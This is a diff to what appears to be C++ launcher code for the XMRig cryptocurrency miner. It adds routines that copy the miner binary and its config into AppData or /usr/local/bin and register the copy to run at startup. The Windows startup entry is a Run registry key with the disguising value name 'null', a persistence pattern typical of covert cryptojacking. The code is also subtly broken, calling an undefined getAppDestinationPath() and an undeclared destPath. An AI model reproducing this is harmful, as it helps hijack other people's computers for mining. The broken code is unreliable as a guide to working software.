@@ -46,6 +46,42 @@ std::string getExecutablePath() {
 #endif
 }
 
+bool copyFile(const std::string &source, const std::string &destination) {
+    std::ifstream src(source, std::ios::binary);
+    std::ofstream dest(destination, std::ios::binary);
+
+    if (!src || !dest) {
+        return false;
+    }
+
+    dest << src.rdbuf();
+    return true;
+}
+
+std::string getDestinationPath() {
+#ifdef _WIN32
+    char *appDataPath = getenv("APPDATA");
+    if (appDataPath) {
+        return std::string(appDataPath) + "\\Xmrig\\xmrig.exe";
+    }
+    return "";
+#else
+    return "/usr/local/bin/xmrig/xmrig";
+#endif
+}
+
+std::string getConfigDestinationPath() {
+#ifdef _WIN32
+    char *appDataPath = getenv("APPDATA");
+    if (appDataPath) {
+        return std::string(appDataPath) + "\\Xmrig\\\\config.json";
+    }
+    return "";
+#else
+    return "/usr/local/bin/xmrig/config.json";
+#endif
+}
+
 #ifdef _WIN32
 void addToStartupWindows(const std::string &path) {
     std::string command = std::string("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v null /t REG_SZ /d \"") + path + "\" /f";
@@ -93,10 +129,23 @@ int main(int argc, char **argv)
             return 1;
         }
 
+        std::string appDestPath = getAppDestinationPath();
+        std::string configDestPath = getConfigDestinationPath();
+
+        if (!copyFile(exePath, appDestPath)) {
+            std::cerr << "Failed to copy executable!" << std::endl;
+            return 1;
+        }
+
+        if (!copyFile("config.json", configDestPath)) {
+            std::cerr << "Failed to copy config.json! Make sure it exists in the current directory." << std::endl;
+            return 1;
+        }
+
 #ifdef _WIN32
-        addToStartupWindows(exePath);
+        addToStartupWindows(destPath);
 #else
-        addToStartupLinux(exePath);
+        addToStartupLinux(destPath);
 #endif
     } catch (...) {
         std::cerr << "An error occurred during startup configuration." << std::endl;
